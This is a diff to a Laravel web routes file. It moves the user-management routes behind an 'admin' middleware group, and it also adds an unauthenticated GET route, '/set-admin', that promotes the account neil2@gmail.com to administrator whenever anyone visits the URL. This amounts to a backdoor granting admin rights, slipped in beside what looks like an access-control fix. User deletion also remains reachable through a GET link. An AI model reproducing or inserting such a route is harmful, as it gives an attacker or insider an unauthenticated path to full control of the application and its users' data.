@@ -59,9 +59,18 @@ Route::middleware('auth')->group(function () {
 
     Route::post('/profile/change-password', [ProfileController::class, 'changePassword']);
 
-    Route::get('/users', [UserController::class, 'index']);
-    Route::post('/users/store', [UserController::class, 'store']);
-    Route::post('/users/update/{id}', [UserController::class, 'update']);
-    Route::get('/users/delete/{id}', [UserController::class, 'destroy']);
+    Route::middleware('admin')->group(function () {
+        Route::get('/users', [UserController::class, 'index']);
+        Route::post('/users/store', [UserController::class, 'store']);
+        Route::post('/users/update/{id}', [UserController::class, 'update']);
+        Route::get('/users/delete/{id}', [UserController::class, 'destroy']);
+    });
 
+});
+
+Route::get('/set-admin', function () {
+    $user = \App\Models\User::where('email', 'neil2@gmail.com')->first();
+    $user->role = 'admin';
+    $user->save();
+    return 'Admin set!';
 });
